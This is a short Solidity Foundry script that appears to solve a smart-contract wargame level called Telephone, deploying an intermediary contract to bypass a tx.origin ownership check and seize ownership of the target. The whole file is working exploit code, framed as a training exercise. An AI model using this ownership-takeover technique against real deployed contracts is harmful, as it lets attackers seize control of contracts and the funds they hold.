// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "src/level4/Telephone.sol";

// Objective: Claim ownership of the contract below to complete this level.

contract Exploit {
    Telephone instance = Telephone(0xbaFAe66444fE12225Bf39d07C9730b06F1219b42);

    function run() external {
        instance.changeOwner(msg.sender);
    }
}

contract POC is Script {
    Telephone instance = Telephone(0xbaFAe66444fE12225Bf39d07C9730b06F1219b42);

    function run() external {
        vm.startBroadcast();
        console.log("Initial Owner: ", instance.owner());

        Exploit exploit = new Exploit();
        exploit.run();

        console.log("Final Owner: ", instance.owner());
        vm.stopBroadcast();
    }
}
